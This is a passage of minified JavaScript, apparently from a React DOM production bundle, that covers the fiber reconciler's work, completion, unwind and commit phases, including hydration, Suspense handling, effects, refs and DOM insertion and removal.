9:e=e.body;break;default:e=e.nodeName==="HTML"?e.ownerDocument.body:e}for(Ae=xt(e.firstChild),Ze=t,fe=!0,ca=null,Rt=!0,a=uu(t,null,n,a),t.child=a;a;)a.flags=a.flags&-3|4096,a=a.sibling}else{if(ja(),n===l){t=$t(e,t,a);break e}We(e,t,n,a)}t=t.child}return t;case 26:return As(e,t),e===null?(a=wf(t.type,null,t.pendingProps,null))?t.memoizedState=a:fe||(a=t.type,e=t.pendingProps,n=Qs(F.current).createElement(a),n[Ie]=t,n[et]=e,Je(n,a,e),Ve(n),t.stateNode=n):t.memoizedState=wf(t.type,e.memoizedProps,t.pendingProps,e.memoizedState),null;case 27:return Gn(t),e===null&&fe&&(n=t.stateNode=Of(t.type,t.pendingProps,F.current),Ze=t,Rt=!0,l=Ae,_a(t.type)?(Rc=l,Ae=xt(n.firstChild)):Ae=l),We(e,t,t.pendingProps.children,a),As(e,t),e===null&&(t.flags|=4194304),t.child;case 5:return e===null&&fe&&((l=n=Ae)&&(n=kh(n,t.type,t.pendingProps,Rt),n!==null?(t.stateNode=n,Ze=t,Ae=xt(n.firstChild),Rt=!1,l=!0):l=!1),l||ra(t)),Gn(t),l=t.type,s=t.pendingProps,i=e!==null?e.memoizedProps:null,n=s.children,Sc(l,s)?n=null:i!==null&&Sc(l,i)&&(t.flags|=32),t.memoizedState!==null&&(l=vo(e,t,Vp,null,null,a),kl._currentValue=l),As(e,t),We(e,t,n,a),t.child;case 6:return e===null&&fe&&((e=a=Ae)&&(a=wh(a,t.pendingProps,Rt),a!==null?(t.stateNode=a,Ze=t,Ae=null,e=!0):e=!1),e||ra(t)),null;case 13:return gd(e,t,a);case 4:return Qe(t,t.stateNode.containerInfo),n=t.pendingProps,e===null?t.child=Va(t,null,n,a):We(e,t,n,a),t.child;case 11:return od(e,t,t.type,t.pendingProps,a);case 7:return We(e,t,t.pendingProps,a),t.child;case 8:return We(e,t,t.pendingProps.children,a),t.child;case 12:return We(e,t,t.pendingProps.children,a),t.child;case 10:return n=t.pendingProps,ua(t,t.type,n.value),We(e,t,n.children,a),t.child;case 9:return l=t.type._context,n=t.pendingProps.children,Ga(t),l=$e(l),n=n(l),t.flags|=1,We(e,t,n,a),t.child;case 14:return cd(e,t,t.type,t.pendingProps,a);case 15:return rd(e,t,t.type,t.pendingProps,a);case 19:return vd(e,t,a);case 31:return Fp(e,t,a);case 22:return ud(e,t,a,t.pendingProps);case 24:return Ga(t),n=$e(Ue),e===null?(l=oo(),l===null&&(l=Te,s=so(),l.pooledCache=s,s.refCount++,s!==null&&(l.pooledCacheLanes|=a),l=s),t.memoizedState={parent:n,cache:l},ro(t),ua(t,Ue,l)):((e.lanes&a)!==0&&(uo(e,t),ul(t,null,null,a),rl()),l=e.memoizedState,s=t.memoizedState,l.parent!==n?(l={parent:n,cache:n},t.memoizedState=l,t.lanes===0&&(t.memoizedState=t.updateQueue.baseState=l),ua(t,Ue,n)):(n=s.cache,ua(t,Ue,n),n!==l.cache&&lo(t,[Ue],a,!0))),We(e,t,t.pendingProps.children,a),t.child;case 29:throw t.pendingProps}throw Error(r(156,t.tag))}function Wt(e){e.flags|=4}function Xo(e,t,a,n,l){if((t=(e.mode&32)!==0)&&(t=!1),t){if(e.flags|=16777216,(l&335544128)===l)if(e.stateNode.complete)e.flags|=8192;else if(Xd())e.flags|=8192;else throw Ka=us,co}else e.flags&=-16777217}function bd(e,t){if(t.type!=="stylesheet"||(t.state.loading&4)!==0)e.flags&=-16777217;else if(e.flags|=16777216,!Uf(t))if(Xd())e.flags|=8192;else throw Ka=us,co}function Cs(e,t){t!==null&&(e.flags|=4),e.flags&16384&&(t=e.tag!==22?Fc():536870912,e.lanes|=t,Dn|=t)}function gl(e,t){if(!fe)switch(e.tailMode){case"hidden":t=e.tail;for(var a=null;t!==null;)t.alternate!==null&&(a=t),t=t.sibling;a===null?e.tail=null:a.sibling=null;break;case"collapsed":a=e.tail;for(var n=null;a!==null;)a.alternate!==null&&(n=a),a=a.sibling;n===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:n.sibling=null}}function xe(e){var t=e.alternate!==null&&e.alternate.child===e.child,a=0,n=0;if(t)for(var l=e.child;l!==null;)a|=l.lanes|l.childLanes,n|=l.subtreeFlags&65011712,n|=l.flags&65011712,l.return=e,l=l.sibling;else for(l=e.child;l!==null;)a|=l.lanes|l.childLanes,n|=l.subtreeFlags,n|=l.flags,l.return=e,l=l.sibling;return e.subtreeFlags|=n,e.childLanes=a,t}function th(e,t,a){var n=t.pendingProps;switch(Fi(t),t.tag){case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return xe(t),null;case 1:return xe(t),null;case 3:return a=t.stateNode,n=null,e!==null&&(n=e.memoizedState.cache),t.memoizedState.cache!==n&&(t.flags|=2048),Xt(Ue),Ce(),a.pendingContext&&(a.context=a.pendingContext,a.pendingContext=null),(e===null||e.child===null)&&(gn(t)?Wt(t):e===null||e.memoizedState.isDehydrated&&(t.flags&256)===0||(t.flags|=1024,to())),xe(t),null;case 26:var l=t.type,s=t.memoizedState;return e===null?(Wt(t),s!==null?(xe(t),bd(t,s)):(xe(t),Xo(t,l,null,n,a))):s?s!==e.memoizedState?(Wt(t),xe(t),bd(t,s)):(xe(t),t.flags&=-16777217):(e=e.memoizedProps,e!==n&&Wt(t),xe(t),Xo(t,l,e,n,a)),null;case 27:if(Bl(t),a=F.current,l=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==n&&Wt(t);else{if(!n){if(t.stateNode===null)throw Error(r(166));return xe(t),null}e=G.current,gn(t)?Fr(t):(e=Of(l,n,a),t.stateNode=e,Wt(t))}return xe(t),null;case 5:if(Bl(t),l=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==n&&Wt(t);else{if(!n){if(t.stateNode===null)throw Error(r(166));return xe(t),null}if(s=G.current,gn(t))Fr(t);else{var i=Qs(F.current);switch(s){case 1:s=i.createElementNS("http://www.w3.org/2000/svg",l);break;case 2:s=i.createElementNS("http://www.w3.org/1998/Math/MathML",l);break;default:switch(l){case"svg":s=i.createElementNS("http://www.w3.org/2000/svg",l);break;case"math":s=i.createElementNS("http://www.w3.org/1998/Math/MathML",l);break;case"script":s=i.createElement("div"),s.innerHTML="<script><\/script>",s=s.removeChild(s.firstChild);break;case"select":s=typeof n.is=="string"?i.createElement("select",{is:n.is}):i.createElement("select"),n.multiple?s.multiple=!0:n.size&&(s.size=n.size);break;default:s=typeof n.is=="string"?i.createElement(l,{is:n.is}):i.createElement(l)}}s[Ie]=t,s[et]=n;e:for(i=t.child;i!==null;){if(i.tag===5||i.tag===6)s.appendChild(i.stateNode);else if(i.tag!==4&&i.tag!==27&&i.child!==null){i.child.return=i,i=i.child;continue}if(i===t)break e;for(;i.sibling===null;){if(i.return===null||i.return===t)break e;i=i.return}i.sibling.return=i.return,i=i.sibling}t.stateNode=s;e:switch(Je(s,l,n),l){case"button":case"input":case"select":case"textarea":n=!!n.autoFocus;break e;case"img":n=!0;break e;default:n=!1}n&&Wt(t)}}return xe(t),Xo(t,t.type,e===null?null:e.memoizedProps,t.pendingProps,a),null;case 6:if(e&&t.stateNode!=null)e.memoizedProps!==n&&Wt(t);else{if(typeof n!="string"&&t.stateNode===null)throw Error(r(166));if(e=F.current,gn(t)){if(e=t.stateNode,a=t.memoizedProps,n=null,l=Ze,l!==null)switch(l.tag){case 27:case 5:n=l.memoizedProps}e[Ie]=t,e=!!(e.nodeValue===a||n!==null&&n.suppressHydrationWarning===!0||yf(e.nodeValue,a)),e||ra(t,!0)}else e=Qs(e).createTextNode(n),e[Ie]=t,t.stateNode=e}return xe(t),null;case 31:if(a=t.memoizedState,e===null||e.memoizedState!==null){if(n=gn(t),a!==null){if(e===null){if(!n)throw Error(r(318));if(e=t.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(r(557));e[Ie]=t}else ja(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;xe(t),e=!1}else a=to(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=a),e=!0;if(!e)return t.flags&256?(mt(t),t):(mt(t),null);if((t.flags&128)!==0)throw Error(r(558))}return xe(t),null;case 13:if(n=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(l=gn(t),n!==null&&n.dehydrated!==null){if(e===null){if(!l)throw Error(r(318));if(l=t.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(r(317));l[Ie]=t}else ja(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;xe(t),l=!1}else l=to(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=l),l=!0;if(!l)return t.flags&256?(mt(t),t):(mt(t),null)}return mt(t),(t.flags&128)!==0?(t.lanes=a,t):(a=n!==null,e=e!==null&&e.memoizedState!==null,a&&(n=t.child,l=null,n.alternate!==null&&n.alternate.memoizedState!==null&&n.alternate.memoizedState.cachePool!==null&&(l=n.alternate.memoizedState.cachePool.pool),s=null,n.memoizedState!==null&&n.memoizedState.cachePool!==null&&(s=n.memoizedState.cachePool.pool),s!==l&&(n.flags|=2048)),a!==e&&a&&(t.child.flags|=8192),Cs(t,t.updateQueue),xe(t),null);case 4:return Ce(),e===null&&pc(t.stateNode.containerInfo),xe(t),null;case 10:return Xt(t.type),xe(t),null;case 19:if(S(Me),n=t.memoizedState,n===null)return xe(t),null;if(l=(t.flags&128)!==0,s=n.rendering,s===null)if(l)gl(n,!1);else{if(we!==0||e!==null&&(e.flags&128)!==0)for(e=t.child;e!==null;){if(s=ps(e),s!==null){for(t.flags|=128,gl(n,!1),e=s.updateQueue,t.updateQueue=e,Cs(t,e),t.subtreeFlags=0,e=a,a=t.child;a!==null;)Zr(a,e),a=a.sibling;return B(Me,Me.current&1|2),fe&&Kt(t,n.treeForkCount),t.child}e=e.sibling}n.tail!==null&&ot()>Ms&&(t.flags|=128,l=!0,gl(n,!1),t.lanes=4194304)}else{if(!l)if(e=ps(s),e!==null){if(t.flags|=128,l=!0,e=e.updateQueue,t.updateQueue=e,Cs(t,e),gl(n,!0),n.tail===null&&n.tailMode==="hidden"&&!s.alternate&&!fe)return xe(t),null}else 2*ot()-n.renderingStartTime>Ms&&a!==536870912&&(t.flags|=128,l=!0,gl(n,!1),t.lanes=4194304);n.isBackwards?(s.sibling=t.child,t.child=s):(e=n.last,e!==null?e.sibling=s:t.child=s,n.last=s)}return n.tail!==null?(e=n.tail,n.rendering=e,n.tail=e.sibling,n.renderingStartTime=ot(),e.sibling=null,a=Me.current,B(Me,l?a&1|2:a&1),fe&&Kt(t,n.treeForkCount),e):(xe(t),null);case 22:case 23:return mt(t),ho(),n=t.memoizedState!==null,e!==null?e.memoizedState!==null!==n&&(t.flags|=8192):n&&(t.flags|=8192),n?(a&536870912)!==0&&(t.flags&128)===0&&(xe(t),t.subtreeFlags&6&&(t.flags|=8192)):xe(t),a=t.updateQueue,a!==null&&Cs(t,a.retryQueue),a=null,e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(a=e.memoizedState.cachePool.pool),n=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(n=t.memoizedState.cachePool.pool),n!==a&&(t.flags|=2048),e!==null&&S(Qa),null;case 24:return a=null,e!==null&&(a=e.memoizedState.cache),t.memoizedState.cache!==a&&(t.flags|=2048),Xt(Ue),xe(t),null;case 25:return null;case 30:return null}throw Error(r(156,t.tag))}function ah(e,t){switch(Fi(t),t.tag){case 1:return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return Xt(Ue),Ce(),e=t.flags,(e&65536)!==0&&(e&128)===0?(t.flags=e&-65537|128,t):null;case 26:case 27:case 5:return Bl(t),null;case 31:if(t.memoizedState!==null){if(mt(t),t.alternate===null)throw Error(r(340));ja()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 13:if(mt(t),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(r(340));ja()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return S(Me),null;case 4:return Ce(),null;case 10:return Xt(t.type),null;case 22:case 23:return mt(t),ho(),e!==null&&S(Qa),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 24:return Xt(Ue),null;case 25:return null;default:return null}}function Ed(e,t){switch(Fi(t),t.tag){case 3:Xt(Ue),Ce();break;case 26:case 27:case 5:Bl(t);break;case 4:Ce();break;case 31:t.memoizedState!==null&&mt(t);break;case 13:mt(t);break;case 19:S(Me);break;case 10:Xt(t.type);break;case 22:case 23:mt(t),ho(),e!==null&&S(Qa);break;case 24:Xt(Ue)}}function yl(e,t){try{var a=t.updateQueue,n=a!==null?a.lastEffect:null;if(n!==null){var l=n.next;a=l;do{if((a.tag&e)===e){n=void 0;var s=a.create,i=a.inst;n=s(),i.destroy=n}a=a.next}while(a!==l)}}catch(c){ve(t,t.return,c)}}function ga(e,t,a){try{var n=t.updateQueue,l=n!==null?n.lastEffect:null;if(l!==null){var s=l.next;n=s;do{if((n.tag&e)===e){var i=n.inst,c=i.destroy;if(c!==void 0){i.destroy=void 0,l=t;var d=a,E=c;try{E()}catch(D){ve(l,d,D)}}}n=n.next}while(n!==s)}}catch(D){ve(t,t.return,D)}}function Td(e){var t=e.updateQueue;if(t!==null){var a=e.stateNode;try{fu(t,a)}catch(n){ve(e,e.return,n)}}}function _d(e,t,a){a.props=Ia(e.type,e.memoizedProps),a.state=e.memoizedState;try{a.componentWillUnmount()}catch(n){ve(e,t,n)}}function vl(e,t){try{var a=e.ref;if(a!==null){switch(e.tag){case 26:case 27:case 5:var n=e.stateNode;break;case 30:n=e.stateNode;break;default:n=e.stateNode}typeof a=="function"?e.refCleanup=a(n):a.current=n}}catch(l){ve(e,t,l)}}function qt(e,t){var a=e.ref,n=e.refCleanup;if(a!==null)if(typeof n=="function")try{n()}catch(l){ve(e,t,l)}finally{e.refCleanup=null,e=e.alternate,e!=null&&(e.refCleanup=null)}else if(typeof a=="function")try{a(null)}catch(l){ve(e,t,l)}else a.current=null}function Rd(e){var t=e.type,a=e.memoizedProps,n=e.stateNode;try{e:switch(t){case"button":case"input":case"select":case"textarea":a.autoFocus&&n.focus();break e;case"img":a.src?n.src=a.src:a.srcSet&&(n.srcset=a.srcSet)}}catch(l){ve(e,e.return,l)}}function Io(e,t,a){try{var n=e.stateNode;Rh(n,e.type,a,t),n[et]=t}catch(l){ve(e,e.return,l)}}function Ad(e){return e.tag===5||e.tag===3||e.tag===26||e.tag===27&&_a(e.type)||e.tag===4}function Zo(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Ad(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.tag===27&&_a(e.type)||e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function $o(e,t,a){var n=e.tag;if(n===5||n===6)e=e.stateNode,t?(a.nodeType===9?a.body:a.nodeName==="HTML"?a.ownerDocument.body:a).insertBefore(e,t):(t=a.nodeType===9?a.body:a.nodeName==="HTML"?a.ownerDocument.body:a,t.appendChild(e),a=a._reactRootContainer,a!=null||t.onclick!==null||(t.onclick=Gt));else if(n!==4&&(n===27&&_a(e.type)&&(a=e.stateNode,t=null),e=e.child,e!==null))for($o(e,t,a),e=e.sibling;e!==null;)$o(e,t,a),e=e.sibling}function Os(e,t,a){var n=e.tag;if(n===5||n===6)e=e.stateNode,t?a.insertBefore(e,t):a.appendChild(e);else if(n!==4&&(n===27&&_a(e.type)&&(a=e.stateNode),e=e.child,e!==null))for(Os(e,t,a),e=e.sibling;e!==null;)Os(e,t,a),e=e.sibling}function xd(e){var t=e.stateNode,a=e.memoizedProps;try{for(var n=e.type,l=t.attributes;l.length;)t.removeAttributeNode(l[0]);Je(t,n,a),t[Ie]=e,t[et]=a}catch(s){ve(e,e.return,s)}}var Jt=!1,je=!1,Wo=!1,Cd=typeof WeakSet=="function"?WeakSet:Set,Xe=null;function nh(e,t){if(e=e.containerInfo,yc=$s,e=jr(e),Qi(e)){if("selectionStart"in e)var a={start:e.selectionStart,end:e.selectionEnd};else e:{a=(a=e.ownerDocument)&&a.defaultView||window;var n=a.getSelection&&a.getSelection();if(n&&n.rangeCount!==0){a=n.anchorNode;var l=n.anchorOffset,s=n.focusNode;n=n.focusOffset;try{a.nodeType,s.nodeType}catch{a=null;break e}var i=0,c=-1,d=-1,E=0,D=0,M=e,T=null;t:for(;;){for(var _;M!==a||l!==0&&M.nodeType!==3||(c=i+l),M!==s||n!==0&&M.nodeType!==3||(d=i+n),M.nodeType===3&&(i+=M.nodeValue.length),(_=M.firstChild)!==null;)T=M,M=_;for(;;){if(M===e)break t;if(T===a&&++E===l&&(c=i),T===s&&++D===n&&(d=i),(_=M.nextSibling)!==null)break;M=T,T=M.parentNode}M=_}a=c===-1||d===-1?null:{start:c,end:d}}else a=null}a=a||{start:0,end:0}}else a=null;for(vc={focusedElem:e,selectionRange:a},$s=!1,Xe=t;Xe!==null;)if(t=Xe,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,Xe=e;else for(;Xe!==null;){switch(t=Xe,s=t.alternate,e=t.flags,t.tag){case 0:if((e&4)!==0&&(e=t.updateQueue,e=e!==null?e.events:null,e!==null))for(a=0;a<e.length;a++)l=e[a],l.ref.impl=l.nextImpl;break;case 11:case 15:break;case 1:if((e&1024)!==0&&s!==null){e=void 0,a=t,l=s.memoizedProps,s=s.memoizedState,n=a.stateNode;try{var Q=Ia(a.type,l);e=n.getSnapshotBeforeUpdate(Q,s),n.__reactInternalSnapshotBeforeUpdate=e}catch(Z){ve(a,a.return,Z)}}break;case 3:if((e&1024)!==0){if(e=t.stateNode.containerInfo,a=e.nodeType,a===9)Ec(e);else if(a===1)switch(e.nodeName){case"HEAD":case"HTML":case"BODY":Ec(e);break;default:e.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;default:if((e&1024)!==0)throw Error(r(163))}if(e=t.sibling,e!==null){e.return=t.return,Xe=e;break}Xe=t.return}}function Od(e,t,a){var n=a.flags;switch(a.tag){case 0:case 11:case 15:Ft(e,a),n&4&&yl(5,a);break;case 1:if(Ft(e,a),n&4)if(e=a.stateNode,t===null)try{e.componentDidMount()}catch(i){ve(a,a.return,i)}else{var l=Ia(a.type,t.memoizedProps);t=t.memoizedState;try{e.componentDidUpdate(l,t,e.__reactInternalSnapshotBeforeUpdate)}catch(i){ve(a,a.return,i)}}n&64&&Td(a),n&512&&vl(a,a.return);break;case 3:if(Ft(e,a),n&64&&(e=a.updateQueue,e!==null)){if(t=null,a.child!==null)switch(a.child.tag){case 27:case 5:t=a.child.stateNode;break;case 1:t=a.child.stateNode}try{fu(e,t)}catch(i){ve(a,a.return,i)}}break;case 27:t===null&&n&4&&xd(a);case 26:case 5:Ft(e,a),t===null&&n&4&&Rd(a),n&512&&vl(a,a.return);break;case 12:Ft(e,a);break;case 31:Ft(e,a),n&4&&wd(e,a);break;case 13:Ft(e,a),n&4&&Md(e,a),n&64&&(e=a.memoizedState,e!==null&&(e=e.dehydrated,e!==null&&(a=fh.bind(null,a),Mh(e,a))));break;case 22:if(n=a.memoizedState!==null||Jt,!n){t=t!==null&&t.memoizedState!==null||je,l=Jt;var s=je;Jt=n,(je=t)&&!s?ea(e,a,(a.subtreeFlags&8772)!==0):Ft(e,a),Jt=l,je=s}break;case 30:break;default:Ft(e,a)}}function Dd(e){var t=e.alternate;t!==null&&(e.alternate=null,Dd(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&Ai(t)),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}var Oe=null,at=!1;function Pt(e,t,a){for(a=a.child;a!==null;)kd(e,t,a),a=a.sibling}function kd(e,t,a){if(ct&&typeof ct.onCommitFiberUnmount=="function")try{ct.onCommitFiberUnmount(Qn,a)}catch{}switch(a.tag){case 26:je||qt(a,t),Pt(e,t,a),a.memoizedState?a.memoizedState.count--:a.stateNode&&(a=a.stateNode,a.parentNode.removeChild(a));break;case 27:je||qt(a,t);var n=Oe,l=at;_a(a.type)&&(Oe=a.stateNode,at=!1),Pt(e,t,a),Cl(a.stateNode),Oe=n,at=l;break;case 5:je||qt(a,t);case 6:if(n=Oe,l=at,Oe=null,Pt(e,t,a),Oe=n,at=l,Oe!==null)if(at)try{(Oe.nodeType===9?Oe.body:Oe.nodeName==="HTML"?Oe.ownerDocument.body:Oe).removeChild(a.stateNode)}catch(s){ve(a,t,s)}else try{Oe.removeChild(a.stateNode)}catch(s){ve(a,t,s)}break;case 18:Oe!==null&&(at?(e=Oe,_f(e.nodeType===9?e.body:e.nodeName==="HTML"?e.ownerDocument.body:e,a.stateNode),zn(e)):_f(Oe,a.stateNode));break;case 4:n=Oe,l=at,Oe=a.stateNode.containerInfo,at=!0,Pt(e,t,a),Oe=n,at=l;break;case 0:case 11:case 14:case 15:ga(2,a,t),je||ga(4,a,t),Pt(e,t,a);break;case 1:je||(qt(a,t),n=a.stateNode,typeof n.componentWillUnmount=="function"&&_d(a,t,n)),Pt(e,t,a);break;case 21:Pt(e,t,a);break;case 22:je=(n=je)||a.memoizedState!==null,Pt(e,t,a),je=n;break;default:Pt(e,t,a)}}function wd(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null))){e=e.dehydrated;try{zn(e)}catch(a){ve(t,t.return,a)}}}function Md(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null&&(e=e.dehydrated,e!==null))))try{zn(e)}catch(a){ve(t,t.return,a)}}function lh(e){switch(e.tag){case 31:case 13:case 19:var t=e.stateNode;return t===null&&(t=e.stateNode=new Cd),t;case 22:return e=e.stateNode,t=e._retryCache,t===null&&(t=e._retryCache=new Cd),t;default:throw Error(r(435,e.tag))}}function Ds(e,t){var a=lh(e);t.forEach(function(n){if(!a.has(n)){a.add(n);var l=mh.bind(null,e,n);n.then(l,l)}})}function nt(e,t){var a=t.deletions;if(a!==null)for(var n=0;n<a.length;n++){var l=a[n],s=e,i=t,c=i;e:for(;c!==null;){switch(c.tag){case 27:if(_a(c.type)){Oe=c.stateNode,at=!1;break e}break;case 5:Oe=c.stateNode,at=!1;break e;case 3:case 4:Oe=c.stateNode.containerInfo,at=!0;break e}c=c.return}if(Oe===null)throw Error(r(160));kd(s,i,l),Oe=null,at=!1,s=l.alternate,s!==null&&(s.return=null),l.return=null}if(t.subtreeFlags&13886)for(t=t.child;t!==null;)Ld(t,e),t=t.sibling}var Dt=null;function Ld(e,t){var a=e.alternate,n=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:nt(t,e),lt(e),n&4&&(ga(3,e,e.return),yl(3,e),ga(5,e,e.return));break;case 1:nt(t,e),lt(e),n&512&&(je||a===null||qt(a,a.return)),n&64&&Jt&&(e=e.updateQueue,e!==null&&(n=e.callbacks,n!==null&&(a=e.shared.hiddenCallbacks,e.shared.hiddenCallbacks=a===null?n:a.concat(n))));break;case 26:var l=Dt;if(nt(t,e),lt(e),n&512&&(je||a===null||qt(a,a.return)),n&4){var s=a!==null?a.memoizedState:null;if(n=e.memoizedState,a===null)if(n===null)if(e.stateNode===null){e:{n=e.type,a=e.memoizedProps,l=l.ownerDocument||l;t:switch(n){case"title":s=l.getElementsByTagName("title")[0],(!s||s[Vn]||s[Ie]||s.namespaceURI==="http://www.w3.org/2000/svg"||s.hasAttribute("itemprop"))&&(s=l.createElement(n),l.head.insertBefore(s,l.querySelector("head > title"))),Je(s,n,a),s[Ie]=e,Ve(s),n=s;break e;case"link":var i=Nf("link","href",l).get(n+(a.href||""));if(i){for(var c=0;c<i.length;c++)if(s=i[c],s.getAttribute("href")===(a.href==null||a.href===""?null:a.href)&&s.getAttribute("rel")===(a.rel==null?null:a.rel)&&s.getAttribute("title")===(a.title==null?null:a.title)&&s.getAttribute("crossorigin")===(a.crossOrigin==null?null:a.crossOrigin)){i.splice(c,1);break t}}s=l.createElement(n),Je(s,n,a),l.head.appendChild(s);break;case"meta":if(i=Nf("meta","content",l).get(n+(a.content||""))){for(c=0;c<i.length;c++)if(s=i[c],s.getAttribute("content")===(a.content==null?null:""+a.content)&&s.getAttribute("name")===(a.name==null?null:a.name)&&s.getAttribute("property")===(a.property==null?null:a.property)&&s.getAttribute("http-equiv")===(a.httpEquiv==null?null:a.httpEquiv)&&s.getAttribute("charset")===(a.charSet==null?null:a.charSet)){i.splice(c,1);break t}}s=l.createElement(n),Je(s,n,a),l.head.appendChild(s);break;default:throw Error(r(468,n))}s[Ie]=e,Ve(s),n=s}e.stateNode=n}else qf(l,e.type,e.stateNode);else e.stateNode=Lf(l,n,e.memoizedProps);else s!==n?(s===null?a.stateNode!==null&&(a=a.stateNode,a.parentNode.removeChild(a)):s.count--,n===null?qf(l,e.type,e.stateNode):Lf(l,n,e.memoizedProps)):n===null&&e.stateNode!==null&&Io(e,e.memoizedProps,a.memoizedProps)}break;case 27:nt(t,e),lt(e),n&512&&(je||a===null||qt(a,a.return)),a!==null&&n&4&&Io(e,e.memoizedProps,a.memoizedProps);break;case 5:if(nt(t,e),lt(e),n&512&&(je||a===null||qt(a,a.return)),e.flags&32){l=e.stateNode;try{sn(l,"")}catch(Q){ve(e,e.return,Q)}}n&4&&e.stateNode!=null&&(l=e.memoizedProps,Io(e,l,a!==null?a.memoizedProps:l)),n&1024&&(Wo=!0);break;case 6:if(nt(t,e),lt(e),n&4){if(e.stateNode===null)throw Error(r(162));n=e.memoizedProps,a=e.stateNode;try{a.nodeValue=n}catch(Q){ve(e,e.return,Q)}}break;case 3:if(Vs=null,l=Dt,Dt=Ys(t.containerInfo),nt(t,e),Dt=l,lt(e),n&4&&a!==null&&a.memoizedState.isDehydrated)try{zn(t.containerInfo)}catch(Q){ve(e,e.return,Q)}Wo&&(Wo=!1,Nd(e));break;case 4:n=Dt,Dt=Ys(e.stateNode.containerInfo),nt(t,e),lt(e),Dt=n;break;case 12:nt(t,e),lt(e);break;case 31:nt(t,e),lt(e),n&4&&(n=e.updateQueue,n!==null&&(e.updateQueue=null,Ds(e,n)));break;case 13:nt(t,e),lt(e),e.child.flags&8192&&e.memoizedState!==null!=(a!==null&&a.memoizedState!==null)&&(ws=ot()),n&4&&(n=e.updateQueue,n!==null&&(e.updateQueue=null,Ds(e,n)));break;case 22:l=e.memoizedState!==null;var d=a!==null&&a.memoizedState!==null,E=Jt,D=je;if(Jt=E||l,je=D||d,nt(t,e),je=D,Jt=E,lt(e),n&8192)e:for(t=e.stateNode,t._visibility=l?t._visibility&-2:t._visibility|1,l&&(a===null||d||Jt||je||Za(e)),a=null,t=e;;){if(t.tag===5||t.tag===26){if(a===null){d=a=t;try{if(s=d.stateNode,l)i=s.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none";else{c=d.stateNode;var M=d.memoizedProps.style,T=M!=null&&M.hasOwnProperty("display")?M.display:null;c.style.display=T==null||typeof T=="boolean"?"":(""+T).trim()}}catch(Q){ve(d,d.return,Q)}}}else if(t.tag===6){if(a===null){d=t;try{d.stateNode.nodeValue=l?"":d.memoizedProps}catch(Q){ve(d,d.return,Q)}}}else if(t.tag===18){if(a===null){d=t;try{var _=d.stateNode;l?Rf(_,!0):Rf(d.stateNode,!1)}catch(Q){ve(d,d.return,Q)}}}else if((t.tag!==22&&t.tag!==23||t.memoizedState===null||t===e)&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;a===t&&(a=null),t=t.return}a===t&&(a=null),t.sibling.return=t.return,t=t.sibling}n&4&&(n=e.updateQueue,n!==null&&(a=n.retryQueue,a!==null&&(n.retryQueue=null,Ds(e,a))));break;case 19:nt(t,e),lt(e),n&4&&(n=e.updateQueue,n!==null&&(e.updateQueue=null,Ds(e,n)));break;case 30:break;case 21:break;default:nt(t,e),lt(e)}}function lt(e){var t=e.flags;if(t&2){try{for(var a,n=e.return;n!==null;){if(Ad(n)){a=n;break}n=n.return}if(a==null)throw Error(r(160));switch(a.tag){case 27:var l=a.stateNode,s=Zo(e);Os(e,s,l);break;case 5:var i=a.stateNode;a.flags&32&&(sn(i,""),a.flags&=-33);var c=Zo(e);Os(e,c,i);break;case 3:case 4:var d=a.stateNode.containerInfo,E=Zo(e);$o(e,E,d);break;default:throw Error(r(161))}}catch(D){ve(e,e.return,D)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function Nd(e){if(e.subtreeFlags&1024)for(e=e.child;e!==null;){var t=e;Nd(t),t.tag===5&&t.flags&1024&&t.stateNode.reset(),e=e.sibling}}function Ft(e,t){if(t.subtreeFlags&8772)for(t=t.child;t!==null;)Od(e,t.alternate,t),t=t.sibling}function Za(e){for(e=e.child;e!==null;){var t=e;switch(t.tag){case 0:case 11:case 14:case 15:ga(4,t,t.return),Za(t);break;case 1:qt(t,t.return);var a=t.stateNode;typeof a.componentWillUnmount=="function"&&_d(t,t.return,a),Za(t);break;case 27:Cl(t.stateNode);case 26:case 5:qt(t,t.return),Za(t);break;case 22:t.memoizedState===null&&Za(t);break;case 30:Za(t);break;default:Za(t)}e=e.sibling}}function ea(e,t,a){for(a=a&&(t.subtreeFlags&8772)!==0,t=t.child;t!==null;){var n=t.alternate,l=e,s=t,i=s.flags;switch(s.tag){case 0:case 11:case 15:ea(l,s,a),yl(4,s);break;case 1:if(ea(l,s,a),n=s,l=n.stateNode,typeof 